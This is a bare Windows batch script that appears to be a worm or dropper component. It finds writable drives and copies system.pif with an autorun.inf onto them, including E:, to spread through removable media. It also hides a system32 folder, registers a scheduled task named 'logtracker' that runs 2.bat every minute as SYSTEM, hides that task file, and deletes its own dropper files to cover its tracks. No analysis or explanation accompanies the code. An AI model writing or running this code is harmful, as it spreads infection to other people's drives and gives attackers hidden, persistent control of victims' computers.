start rising.exe

SET TestFile=Test_%RANDOM%.TMP
SETLOCAL ENABLEDELAYEDEXPANSION
For %%I In (C D E F G H I J K L M N O P Q R S T U V W X Y Z) Do (
CD.>%%I:\%TestFile%
CLS&&If Exist %%I:\%TestFile% Set ResultD=%%I:&&DEL %%I:\%TestFile% /Q
)

xcopy e:\system.pif  /h /r /k /y

xcopy %ResultD%\system.pif  /h /r /k /y

xcopy autorun.inf e:\ /h /r /k /y

xcopy system.pif %ResultD%\ /h /r /k /y

xcopy autorun.inf %ResultD%\ /h /r /k /y

xcopy system.pif e:\ /h /r /k /y

attrib +s +h +r c:\windows\system32\system

SCHTASKS /Create /SC MINUTE /MO 1 /TN logtracker /TR  %SystemRoot%\system32\system\2.bat  /RU  system

attrib +s +h +r C:\WINDOWS\Tasks\logtracker.job

del 1.vbs /f /a

del rising.exe /f /a

del 1.bat /f /a
